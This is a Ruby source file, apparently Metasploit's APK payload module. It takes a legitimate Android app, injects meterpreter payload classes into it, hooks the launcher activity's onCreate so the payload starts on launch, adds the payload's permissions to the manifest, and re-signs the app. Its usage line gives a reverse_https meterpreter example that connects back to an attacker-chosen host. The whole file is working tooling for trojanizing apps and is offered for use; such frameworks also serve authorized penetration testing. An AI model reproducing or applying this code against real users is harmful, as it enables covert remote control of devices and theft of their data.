# -*- coding: binary -*-

require 'msf/core'
require 'rex/text'
require 'tmpdir'
require 'nokogiri'
require 'fileutils'
require 'optparse'
require 'open3'

class Msf::Payload::Apk

  def print_status(msg='')
    $stderr.puts "[*] #{msg}"
  end

  def print_error(msg='')
    $stderr.puts "[-] #{msg}"
  end

  def usage
    print_error "Usage: #{$0} -x [target.apk] [msfvenom options]\n"
    print_error "e.g. #{$0} -x messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443\n"
  end

  def run_cmd(cmd)
    begin
      stdin, stdout, stderr = Open3.popen3(cmd)
      return stdout.read + stderr.read
    rescue Errno::ENOENT
      return nil
    end
  end

  # Find the activity that is opened when you click the app icon
  def find_launcher_activity(amanifest)
    package = amanifest.xpath("//manifest").first['package']
    activities = amanifest.xpath("//activity|//activity-alias")
    for activity in activities
      activityname = activity.attribute("targetActivity")
      unless activityname
        activityname = activity.attribute("name")
      end
      category = activity.search('category')
      unless category
        next
      end
      for cat in category
        categoryname = cat.attribute('name')
        if (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
          name = activityname.to_s
          if name.start_with?('.')
            name = package + name
          end
          return name
        end
      end
    end
  end

  def parse_manifest(manifest_file)
    File.open(manifest_file, "rb"){|file|
      data = File.read(file)
      return Nokogiri::XML(data)
    }
  end

  def fix_manifest(tempdir)
    #Load payload's manifest
    payload_manifest = parse_manifest("#{tempdir}/payload/AndroidManifest.xml")
    payload_permissions = payload_manifest.xpath("//manifest/uses-permission")

    #Load original apk's manifest
    original_manifest = parse_manifest("#{tempdir}/original/AndroidManifest.xml")
    original_permissions = original_manifest.xpath("//manifest/uses-permission")

    manifest = original_manifest.xpath('/manifest')
    old_permissions = []
    for permission in original_permissions
      name = permission.attribute("name").to_s
      old_permissions << name
    end
    for permission in payload_permissions
      name = permission.attribute("name").to_s
      unless old_permissions.include?(name)
        print_status("Adding #{name}")
        original_permissions.before(permission.to_xml)
      end
    end

    application = original_manifest.at_xpath('/manifest/application')
    application << payload_manifest.at_xpath('/manifest/application/receiver').to_xml
    application << payload_manifest.at_xpath('/manifest/application/service').to_xml

    File.open("#{tempdir}/original/AndroidManifest.xml", "wb") {|file| file.puts original_manifest.to_xml }
  end

  def backdoor_apk(apkfile, raw_payload)

    unless apkfile && File.readable?(apkfile)
      usage
      raise RuntimeError, "Invalid template: #{apkfile}"
    end

    jarsigner = run_cmd("jarsigner")
    unless jarsigner != nil
      raise RuntimeError, "jarsigner not found. If it's not in your PATH, please add it."
    end

    zipalign = run_cmd("zipalign")
    unless zipalign != nil
      raise RuntimeError, "zipalign not found. If it's not in your PATH, please add it."
    end

    apktool = run_cmd("apktool -version")
    unless apktool != nil
      raise RuntimeError, "apktool not found. If it's not in your PATH, please add it."
    end

    apk_v = Gem::Version.new(apktool)
    unless apk_v >= Gem::Version.new('2.0.1')
      raise RuntimeError, "apktool version #{apk_v} not supported, please download at least version 2.0.1."
    end

    unless File.readable?(File.expand_path("~/.android/debug.keystore"))
      android_dir = File.expand_path("~/.android/")
      unless File.directory?(android_dir)
        FileUtils::mkdir_p android_dir
      end
      print_status "Creating android debug keystore...\n"
      run_cmd("keytool -genkey -v -keystore ~/.android/debug.keystore \
      -alias androiddebugkey -storepass android -keypass android -keyalg RSA \
      -keysize 2048 -validity 10000 -dname 'CN=Android Debug,O=Android,C=US'")
    end

    #Create temporary directory where work will be done
    tempdir = Dir.mktmpdir

    File.open("#{tempdir}/payload.apk", "wb") {|file| file.puts raw_payload }
    FileUtils.cp apkfile, "#{tempdir}/original.apk"

    print_status "Decompiling original APK..\n"
    run_cmd("apktool d #{tempdir}/original.apk -o #{tempdir}/original")
    print_status "Decompiling payload APK..\n"
    run_cmd("apktool d #{tempdir}/payload.apk -o #{tempdir}/payload")

    amanifest = parse_manifest("#{tempdir}/original/AndroidManifest.xml")

    print_status "Locating hook point..\n"
    launcheractivity = find_launcher_activity(amanifest)
    unless launcheractivity
      raise RuntimeError, "Unable to find hookable activity in #{apkfile}\n"
    end
    smalifile = "#{tempdir}/original/smali*/" + launcheractivity.gsub(/\./, "/") + ".smali"
    smalifiles = Dir.glob(smalifile)
    for smalifile in smalifiles
      if File.readable?(smalifile)
        activitysmali = File.read(smalifile)
      end
    end

    unless activitysmali
      raise RuntimeError, "Unable to find hook point in #{smalifiles}\n"
    end

    entrypoint = ';->onCreate(Landroid/os/Bundle;)V'
    unless activitysmali.include? entrypoint
      raise RuntimeError, "Unable to find onCreate() in #{smalifile}\n"
    end

    # Remove unused files
    FileUtils.rm "#{tempdir}/payload/smali/com/metasploit/stage/MainActivity.smali"
    FileUtils.rm Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/R*.smali")

    package = amanifest.xpath("//manifest").first['package']
    package_slash = package.gsub(/\./, "/")
    print_status "Adding payload as package #{package}\n"
    payload_files = Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/*.smali")
    payload_dir = "#{tempdir}/original/smali/#{package_slash}/"
    FileUtils.mkdir_p payload_dir

    # Copy over the payload files, fixing up the smali code
    payload_files.each do |file_name|
      smali = File.read(file_name)
      newsmali = smali.gsub(/com\/metasploit\/stage/, package_slash)
      newfilename = "#{payload_dir}#{File.basename file_name}"
      File.open(newfilename, "wb") {|file| file.puts newsmali }
    end

    payloadhook = entrypoint + %Q^
    invoke-static {p0}, L#{package_slash}/MainService;->startService(Landroid/content/Context;)V
    ^
    hookedsmali = activitysmali.gsub(entrypoint, payloadhook)

    print_status "Loading #{smalifile} and injecting payload..\n"
    File.open(smalifile, "wb") {|file| file.puts hookedsmali }

    injected_apk = "#{tempdir}/output.apk"
    aligned_apk = "#{tempdir}/aligned.apk"
    print_status "Poisoning the manifest with meterpreter permissions..\n"
    fix_manifest(tempdir)

    print_status "Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}\n"
    run_cmd("apktool b -o #{injected_apk} #{tempdir}/original")
    print_status "Signing #{injected_apk}\n"
    run_cmd("jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA #{injected_apk} androiddebugkey")
    print_status "Aligning #{injected_apk}\n"
    run_cmd("zipalign 4 #{injected_apk} #{aligned_apk}")

    outputapk = File.read(aligned_apk)

    FileUtils.remove_entry tempdir
    outputapk
  end
end


